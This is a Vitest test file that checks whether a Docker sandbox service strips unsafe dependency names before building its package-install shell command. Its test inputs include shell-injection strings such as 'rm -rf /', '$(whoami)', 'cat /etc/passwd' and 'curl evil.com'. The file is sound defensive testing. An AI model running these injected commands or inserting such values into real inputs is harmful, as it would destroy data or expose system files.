import { describe, it, expect, vi, beforeEach } from "vitest";

// Mock child_process and shared before importing service
vi.mock("node:child_process", () => ({
  execFile: vi.fn(),
}));

vi.mock("@ai-cofounder/shared", () => ({
  createLogger: () => ({
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  }),
}));

// We need to test the internal sanitizeDeps function and LANGUAGE_COMMANDS.
// Since sanitizeDeps is not exported, test it indirectly through LANGUAGE_COMMANDS
// by checking the generated command strings.
// However, the SandboxService.execute() calls LANGUAGE_COMMANDS internally.
// The simplest approach: import the module and test via execute() behavior,
// or test the pattern directly.

// The SAFE_DEP_PATTERN and sanitizeDeps are module-private, but we can
// test them indirectly through the command generation in LANGUAGE_COMMANDS.
// Since LANGUAGE_COMMANDS is also not exported, we'll test via SandboxService.execute().

import { execFile } from "node:child_process";

const mockExecFile = vi.mocked(execFile);

const { SandboxService } = await import("../service.js");

function createDockerAvailableService(): InstanceType<typeof SandboxService> {
  return new SandboxService({ dockerAvailable: true });
}

/** Extract the command passed to docker run from the execFile mock call */
function getDockerCommand(): string[] {
  const call = mockExecFile.mock.calls[0];
  // execFile("docker", dockerArgs, options, callback)
  return call[1] as string[];
}

/** Simulate docker execution completing immediately */
function mockDockerSuccess(stdout = "output") {
  mockExecFile.mockImplementation(((
    _cmd: string,
    _args: string[],
    _opts: unknown,
    cb: (err: Error | null, stdout: string, stderr: string) => void,
  ) => {
    cb(null, stdout, "");
    return {} as ReturnType<typeof execFile>;
  }) as typeof execFile);
}

describe("Sandbox dependency validation", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // ── Valid dependency names ────────────────────────────────

  describe("allows safe dependency names", () => {
    it("allows simple package name", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["lodash"],
      });
      const args = getDockerCommand();
      const shCommand = args[args.length - 1]; // last arg is the sh -c command
      expect(shCommand).toContain("lodash");
    });

    it("allows scoped package name", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["@types/node"],
      });
      const args = getDockerCommand();
      const shCommand = args[args.length - 1];
      expect(shCommand).toContain("@types/node");
    });

    it("allows package with version specifier", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["lodash@4.17.21"],
      });
      const args = getDockerCommand();
      const shCommand = args[args.length - 1];
      expect(shCommand).toContain("lodash@4.17.21");
    });

    it("allows package with caret version", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["express@^4.18.0"],
      });
      const args = getDockerCommand();
      const shCommand = args[args.length - 1];
      expect(shCommand).toContain("express@^4.18.0");
    });

    it("allows package with dots and hyphens", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["socket.io-client"],
      });
      const args = getDockerCommand();
      const shCommand = args[args.length - 1];
      expect(shCommand).toContain("socket.io-client");
    });

    it("allows Python package name", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "python",
        code: "print(1)",
        dependencies: ["requests"],
      });
      const args = getDockerCommand();
      const shCommand = args[args.length - 1];
      expect(shCommand).toContain("requests");
    });
  });

  // ── Malicious dependency names (should be filtered out) ───

  describe("filters out malicious dependency names", () => {
    it("rejects command injection via semicolon", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["lodash; rm -rf /"],
      });
      // With the malicious dep filtered, no deps remain → no shell command
      const args = getDockerCommand();
      // Should use direct node invocation, not sh -c with npm install
      expect(args).toContain("node");
      expect(args[args.length - 1]).not.toContain("rm -rf");
    });

    it("rejects command substitution via $()", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["$(whoami)"],
      });
      const args = getDockerCommand();
      expect(args).toContain("node");
      expect(args[args.length - 1]).not.toContain("whoami");
    });

    it("rejects backtick command substitution", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["`curl evil.com`"],
      });
      const args = getDockerCommand();
      expect(args).toContain("node");
      expect(args[args.length - 1]).not.toContain("curl");
    });

    it("rejects pipe injection", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["lodash | cat /etc/passwd"],
      });
      const args = getDockerCommand();
      expect(args).toContain("node");
      expect(args[args.length - 1]).not.toContain("/etc/passwd");
    });

    it("rejects ampersand injection", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["lodash && curl evil.com"],
      });
      const args = getDockerCommand();
      expect(args).toContain("node");
    });

    it("rejects redirect injection", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["lodash > /tmp/evil"],
      });
      const args = getDockerCommand();
      expect(args).toContain("node");
    });

    it("rejects newline injection", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["lodash\nrm -rf /"],
      });
      const args = getDockerCommand();
      expect(args).toContain("node");
    });

    it("rejects spaces in dependency names", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["lodash evil-package"],
      });
      const args = getDockerCommand();
      expect(args).toContain("node");
    });

    it("keeps valid deps and drops invalid ones from mixed input", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["lodash", "$(evil)", "express"],
      });
      const args = getDockerCommand();
      const shCommand = args[args.length - 1];
      expect(shCommand).toContain("lodash");
      expect(shCommand).toContain("express");
      expect(shCommand).not.toContain("evil");
    });
  });

  // ── Language-specific handling ─────────────────────────────

  describe("works across all languages", () => {
    it("filters deps for typescript", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "typescript",
        code: "console.log(1)",
        dependencies: ["lodash", "; rm -rf /"],
      });
      const args = getDockerCommand();
      const shCommand = args[args.length - 1];
      expect(shCommand).toContain("lodash");
      expect(shCommand).not.toContain("rm -rf");
    });

    it("filters deps for python", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "python",
        code: "print(1)",
        dependencies: ["requests", "$(evil)"],
      });
      const args = getDockerCommand();
      const shCommand = args[args.length - 1];
      expect(shCommand).toContain("requests");
      expect(shCommand).not.toContain("evil");
    });

    it("uses direct invocation when all deps are filtered out (javascript)", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: ["; rm -rf /", "$(evil)"],
      });
      const args = getDockerCommand();
      // All deps filtered → falls back to direct node invocation
      expect(args).toContain("node");
      expect(args).toContain("-e");
    });

    it("uses direct invocation when all deps are filtered out (python)", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "python",
        code: "print(1)",
        dependencies: ["; rm -rf /"],
      });
      const args = getDockerCommand();
      expect(args).toContain("python3");
      expect(args).toContain("-c");
    });
  });

  // ── Empty/undefined deps ──────────────────────────────────

  describe("handles empty/undefined deps", () => {
    it("handles undefined dependencies", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
      });
      const args = getDockerCommand();
      expect(args).toContain("node");
      expect(args).toContain("-e");
    });

    it("handles empty array dependencies", async () => {
      mockDockerSuccess();
      const service = createDockerAvailableService();
      await service.execute({
        language: "javascript",
        code: "console.log(1)",
        dependencies: [],
      });
      const args = getDockerCommand();
      expect(args).toContain("node");
      expect(args).toContain("-e");
    });
  });
});
